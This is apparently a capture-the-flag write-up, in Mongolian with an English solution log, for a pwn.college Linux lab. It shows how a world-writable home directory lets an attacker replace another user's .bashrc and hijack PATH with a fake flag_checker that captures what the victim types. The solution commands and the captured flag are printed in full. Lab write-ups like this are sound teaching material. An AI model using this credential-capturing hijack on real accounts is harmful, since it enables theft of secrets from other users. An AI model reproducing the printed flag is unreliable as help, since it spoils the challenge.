# Overshared Directories

> Module: **Linux Luminarium / Silly Shenanigans** · Challenge: `overshared-directories`

Зардус `.bashrc`-ээ биш харин home директороо (`/home/zardus`) world-writable болгосон тул би `.bashrc`-ийг устгаад өөрийн хувилбараар сольж, `flag_checker`-ийг hijack хийж флагийг барина.

## Тайлбар

- Linux permission-ы нарийн шинж: **директорт бичих эрхтэй хэн ч түүн доторх файлыг зөөх/устгаж чадна** — тухайн файлыг эзэмшихгүй, файлд өөрт нь бичих эрхгүй байсан ч. Учир нь файлын директортой холбоос директор дотор амьдардаг.
- Тиймээс `/home/zardus` дээр бичих эрхтэй бол би `.bashrc`-ийг устгаад/зөөгөөд өөрийн `.bashrc`-ийг байрлуулж чадна — файл өөрт нь бичих эрхгүй ч болно.
- Payload маань `PATH`-ийн урд өөрийн `/tmp/fakebin`-ийг тавьж, зардусын дуудах `flag_checker`-ийг миний хуурамч script-ээр орлуулна (command hijacking). Хуурамч script нь prompt хэвлээд оруулсан флагийг stdout руу цацна.

## Solution

```console
hacker@shenanigans~overshared-directories:~$ mkdir -p /tmp/fakebin
hacker@shenanigans~overshared-directories:~$ cat > /tmp/fakebin/flag_checker << 'EOF'
#!/bin/bash
echo "Type the flag"
read -r flag
echo "$flag"
EOF
hacker@shenanigans~overshared-directories:~$ chmod +x /tmp/fakebin/flag_checker
hacker@shenanigans~overshared-directories:~$ mv /home/zardus/.bashrc /home/zardus/.bashrc.backup
hacker@shenanigans~overshared-directories:~$ printf '%s\n' 'export PATH=/tmp/fakebin:$PATH' > /home/zardus/.bashrc
hacker@shenanigans~overshared-directories:~$ /challenge/victim
Username: zardus
zardus@shenanigans~overshared-directories:~$ flag_checker
Type the flag
pwn.college{cK-2GAUD5Gv_Hfe7eVbrYs49528.0FM0EzNxwyMwEzM2EzW}
zardus@shenanigans~overshared-directories:~$ exit
logout
hacker@shenanigans~overshared-directories:~$
```

## Flag

```
pwn.college{cK-2GAUD5Gv_Hfe7eVbrYs49528.0FM0EzNxwyMwEzM2EzW}
```
